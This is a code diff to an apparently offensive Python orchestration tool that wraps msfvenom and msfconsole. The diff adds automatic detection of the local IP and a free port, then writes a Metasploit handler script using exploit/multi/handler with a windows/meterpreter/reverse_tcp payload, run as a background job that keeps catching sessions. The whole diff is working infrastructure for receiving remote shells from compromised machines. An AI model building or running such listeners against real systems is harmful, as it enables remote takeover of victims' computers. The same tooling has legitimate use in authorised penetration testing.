@@ -9,6 +9,7 @@ import hashlib
 import zipfile
 import tempfile
 import asyncio
+import socket
 from datetime import datetime, timedelta
 from pathlib import Path
 from typing import Dict, List, Optional, Any, Callable
@@ -1625,6 +1626,30 @@ def run_payload_task(task_id: str, base: Path, params: Dict[str, str]):
     _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfvenom rc={rc}")
 
 
+def _detect_default_lhost() -> str:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "0.0.0.0"
+
+
+def _find_free_port(start: int = 4444, max_tries: int = 50) -> int:
+    port = start
+    for _ in range(max_tries):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            try:
+                sock.bind(("0.0.0.0", port))
+                return port
+            except OSError:
+                port += 1
+    return start
+
+
 def run_listener_task(task_id: str, base: Path, params: Dict[str, str]):
     t = tasks[task_id]
     with locks[task_id]:
@@ -1635,12 +1660,19 @@ def run_listener_task(task_id: str, base: Path, params: Dict[str, str]):
         msfconsole_path = shutil.which("msfconsole")
     except Exception:
         msfconsole_path = None
+    # Auto LHOST/LPORT if not provided
+    lhost = params.get('lhost') or _detect_default_lhost()
+    try:
+        lport = params.get('lport') or str(_find_free_port(int(os.environ.get("ORCH_LISTENER_PORT", "4444"))))
+    except Exception:
+        lport = params.get('lport') or str(_find_free_port(4444))
+    payload = params.get('payload', 'windows/meterpreter/reverse_tcp')
     rc_path = base / "output" / "handler.rc"
     rc_content = f"""
 use exploit/multi/handler
-set PAYLOAD {params.get('payload','windows/meterpreter/reverse_tcp')}
-set LHOST {params.get('lhost','0.0.0.0')}
-set LPORT {params.get('lport','4444')}
+set PAYLOAD {payload}
+set LHOST {lhost}
+set LPORT {lport}
 set ExitOnSession false
 exploit -j -z
 """.strip()
